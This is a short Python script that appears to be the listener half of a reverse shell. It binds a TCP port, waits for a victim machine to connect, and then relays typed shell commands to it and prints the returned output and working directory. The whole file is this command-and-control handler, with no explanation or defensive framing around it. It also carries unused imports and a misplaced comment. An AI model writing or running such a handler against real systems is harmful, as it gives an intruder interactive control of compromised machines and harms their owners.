from http import client
import socket
from unittest import result

HOST = '127.0.0.1'                 # Symbolic name meaning all available interfaces
PORT = 50007   
SEPARATOR = "<sep>"
           # Arbitrary non-privileged port
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            cwd = conn.recv(1024).decode()
            command = input(f'{cwd} $> ')
            if not command.strip():
                continue
            conn.send(command.encode())
            if command.lower() == "exit":
                break
            output = conn.recv(1024).decode()
            results, cwd = output.split(SEPARATOR)
            print(results)


